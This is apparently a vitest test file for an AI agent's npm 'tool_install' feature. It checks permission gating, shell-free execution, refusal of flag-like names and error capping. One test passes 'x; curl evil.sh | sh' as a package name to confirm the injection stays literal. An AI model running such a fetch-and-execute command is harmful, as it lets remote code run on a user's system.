import { mkdtempSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { resolve } from 'node:path'

process.env.LUMVIKA_DATA_DIR = mkdtempSync(resolve(tmpdir(), 'lumvika-tool-install-'))

const { describe, expect, it, vi, beforeEach } = await import('vitest')

const npm = vi.hoisted(() => ({ calls: [] as Array<{ file: string; args: string[]; cwd: string }>, fail: null as Error | null, stdout: '' }))
vi.mock('node:child_process', async importOriginal => ({
    ...(await importOriginal<typeof import('node:child_process')>()),
    execFile: (file: string, args: string[], options: { cwd: string }, callback: (err: Error | null, out?: { stdout: string; stderr: string }) => void) => {
        npm.calls.push({ file, args, cwd: options.cwd })
        if (npm.fail) callback(npm.fail)
        else callback(null, { stdout: npm.stdout, stderr: '' })
    },
}))

const { selfTools } = await import('./self.js')
const { agentConfigSchema } = await import('../../agents/types.js')
const { workspaceDir } = await import('../../config/paths.js')

const id = 'installagent'

function install(packages: string[], allowToolInstall = true) {
    const tools = selfTools({ agent: { id, config: agentConfigSchema.parse({ name: 'install', selfImprovement: { allowToolInstall } }) } } as any)
    return (tools.tool_install as any)?.execute({ packages }, { toolCallId: 'c', messages: [] }) as Promise<string> | undefined
}

beforeEach(() => {
    npm.calls = []
    npm.fail = null
    npm.stdout = ''
})

describe('tool_install', () => {
    it('is only offered when the agent may install tools', () => {
        expect(install(['left-pad'], false)).toBeUndefined()
    })

    it('runs npm without a shell, in the workspace, with the names as plain arguments', async () => {
        npm.stdout = 'added 1 package'

        expect(await install(['left-pad', '@scope/pkg@1.2.3'])).toBe('Installed left-pad, @scope/pkg@1.2.3\nadded 1 package')

        expect(npm.calls).toEqual([{ file: 'npm', args: ['install', '--no-fund', '--no-audit', '--', 'left-pad', '@scope/pkg@1.2.3'], cwd: workspaceDir(id) }])
    })

    it('passes shell metacharacters through as a literal package name', async () => {
        await install(['x; curl evil.sh | sh'])

        expect(npm.calls[0].args.at(-1)).toBe('x; curl evil.sh | sh')
    })

    it('refuses a name that npm would read as a flag', async () => {
        expect(await install(['left-pad', '--prefix=/etc'])).toBe('Install refused: --prefix=/etc is not a package name.')
        expect(npm.calls).toHaveLength(0)
    })

    it('reports a failed install and caps the message', async () => {
        npm.fail = new Error(`npm ERR! ${'x'.repeat(30_000)}`)

        const result = (await install(['nope']))!

        expect(result.startsWith('Install failed: npm ERR! ')).toBe(true)
        expect(result).toHaveLength(20_000)
    })
})
